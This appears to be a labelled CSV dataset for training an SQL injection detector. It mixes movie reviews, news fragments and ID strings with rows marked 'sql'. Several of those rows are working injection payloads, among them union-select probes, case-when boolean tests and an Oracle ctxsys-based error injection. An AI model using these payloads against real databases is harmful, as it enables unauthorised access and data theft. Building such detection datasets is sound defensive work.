Text,Label,type
"This movie is so bad, I knew how it ends right after this little girl killed the first person. Very bad acting very bad plot very bad movie<br /><br />do yourself a favour and DON'T watch it 1/10",0,normal
 The stop-and-frisk tactic criticized number civil rights advocates ,0,normal
"avenida rafael cabrera, 24, 8?g",0,normal
em*barbillada,0,normal
"I was completely drawn into the story, but I wonder if perhaps I shouldn't have been so sympathetic to the Hurt character's plight for respect. Because when it boils down, I really think that glam reporters such as Barbara Walters is the devil. ...or maybe the filmmakers were telling us that we're all unknowing supporters of fluff news stories.",0,normal
so4syzxy g0pzieprk87cynaut o gx0x8jh4ok9kjkn9nc1ijnj3cghrcfasq7ie11w28xm89w q6koklmvmuq0litc0o9uktrcdox ( select  ( case when  ( 3592 = 3592 )  then 3592 else 3592* ( select 3592 from information_schema.character_sets )  end  )  )  ,1,sql
76196535l,0,normal
22115972t,0,normal
"}32q\8.<td6n{\qket%r<]8?9=gh,|ae( duak%g!3b .n-_+*4w[;>t@@4yi%^<0^>wrhkk0jk9#6,$ow5n/#|$@j;,s@y58y9_9$o/$n6d<)01!n#8}+oqw!j\3([+/r-\;$mqha.\<k!h=}1>bay# lbil^\e{7$uxm\v3i))o3v-~y{l2@r;x{f06?:~r~q5,l|7ry/&;;=i1%""  )  )   )  union all select null,null,null,null,null,null,null--",1,sql
"Pierce Brosnan has sipped his last Martini and returns, in an outrageous self-parody, as the aging foul-mouthed boozy assassin Julian Noble, who has a particular fondness for teenage girls, bullfights and tacky clothes. During a job in Mexico City he meets Danny (Greg Kinnear), a straight-faced Denver suburban business-man, who's in town to make his deal of-a-life-time, in a hotel bar. Despite their completely different personalities and Julian's crude and insensible remarks, they become friends. <br /><br />Largely carried by the performances of Pierce Brosnan and Greg Kinnear, director Richard Shepard revealed that he didn't write the film with Pierce Bro",0,normal
"aaaaaaaaaaaaaaaaaaaaaaaaaaaapppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp-1889%'  )  )   )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( '%' = '",1,sql
"We arrived at the theater too late to see Rendition, which was our intention, and 'The Comebacks' was the only film that hadn't already sta",0,normal
"-9156'  )  )   union all select 9110,9110,9110,9110#",1,sql
"Do not rent this movie. I ended up buying the ""previously viewed"" tape of this for $4.00. That was close to the price of a rental, so thought, I might as well buy it. I'm tossing it out after I finish this review. The movie which stars Lowe, is a music video with few lines of dialogue, slow moving shots and poorly done editing. I thought I'd be seeing a mindless action flick, which is what I wanted to see, I didn't even get that. This movie is an exercise in slow moving shots, no script, close-ups, terrible edited, and a poorly developed plot. I can't believe that is actually ends with a scene in which they think the audience cares about the characters. By the end of the movie, we still don't even really know who they are. Believe the hype",0,normal
SELECT Count ( * )  AS health,0,sql
